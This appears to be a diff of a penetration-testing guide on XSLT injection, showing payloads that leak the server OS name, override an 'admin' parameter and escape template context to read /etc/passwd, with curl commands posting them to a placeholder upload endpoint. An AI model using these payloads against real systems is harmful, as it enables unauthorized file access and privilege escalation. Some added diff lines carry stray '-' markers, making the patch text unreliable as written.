@@ -42,44 +42,55 @@ Context escape in XSLT occurs when an attacker bypasses the intended restriction
 
 - Identify user input reflected in XSLT template construction. Focus on parameters or variables within the XSLT code that are affected by user inputs.
 - Inject the following payload to define a new template:
-  ```xml
-  <xsl:template match="/">
-      <xsl:value-of select="system-property('os.name')"/>
-  </xsl:template>
-  ```
-  This payload is designed to leak the server's operating system information.
+-    ```xml
+    <xsl:template match="/">
+        <xsl:value-of select="system-property('os.name')"/>
+    </xsl:template>
+    ```
+    This payload is designed to leak the server's operating system information.
 - Use the following command to inject the payload via CURL:
-  ```bash
-  curl -X POST -d "template=<xsl:template match='/'> <xsl:value-of select='system-property('os.name')'/> </xsl:template>" https://target-app/upload-xslt
-  ```
+-    ```bash
+    cat >/tmp/xslt_os_name.xsl <<'EOF'
+    <xsl:template match="/">
+        <xsl:value-of select="system-property('os.name')"/>
+    </xsl:template>
+    EOF
+    curl -X POST --data-urlencode "template=$(</tmp/xslt_os_name.xsl)" https://target-app/upload-xslt
+    ```
 - Trigger the XSLT transformation process to ensure the template is processed. This action tests whether the injected template is executed.
 
 ### Overriding XSLT Parameters to Influence Logic
 
 - Locate the `<xsl:param>` or `<xsl:variable>` elements that receive data from user input. Determine how these inputs are influencing XSLT parameters.
 - Inject a payload to override an XSLT parameter:
-  ```xml
-  <xsl:param name="admin">true</xsl:param>
-  ```
-  This payload attempts to escalate privileges by overriding the 'admin' parameter.
+-    ```xml
+    <xsl:param name="admin">true</xsl:param>
+    ```
+    This payload attempts to escalate privileges by overriding the 'admin' parameter.
 - Use the CURL command to inject this parameter override:
-  ```bash
-  curl -X POST -d "param=<xsl:param name='admin'>true</xsl:param>" https://target-app/upload-xslt
-  ```
+-    ```bash
+    cat >/tmp/xslt_admin_param.xsl <<'EOF'
+    <xsl:param name="admin">true</xsl:param>
+    EOF
+    curl -X POST --data-urlencode "param=$(</tmp/xslt_admin_param.xsl)" https://target-app/upload-xslt
+    ```
 - After injection, check if access is granted to application features normally restricted by the 'admin' parameter.
 
 ### Context Escape to Inject Arbitrary XSLT Instructions
 
 - Examine input fields for opportunities to escape the current context (e.g., through unescaped template fragments).
 - Attempt context escape by injecting a payload to close existing templates and inject new instructions:
-  ```xml
-  </xsl:template><xsl:template match="/"> <xsl:value-of select="document('file:///etc/passwd')"/> </xsl:template>
-  ```
-  This payload attempts to read sensitive files from the server.
+-    ```xml
+    </xsl:template><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template>
+    ```
+    This payload attempts to read sensitive files from the server.
 - Use CURL to submit the payload:
-  ```bash
-  curl -X POST -d "template=</xsl:template><xsl:template match='/'> <xsl:value-of select='document('file:///etc/passwd')'/> </xsl:template>" https://target-app/upload-xslt
-  ```
+-    ```bash
+    cat >/tmp/xslt_passwd_read.xsl <<'EOF'
+    </xsl:template><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template>
+    EOF
+    curl -X POST --data-urlencode "template=$(</tmp/xslt_passwd_read.xsl)" https://target-app/upload-xslt
+    ```
 - Review the output to see if the content of the sensitive file has been exposed, verifying the success of the context escape and arbitrary code execution.
 
 ## Tools
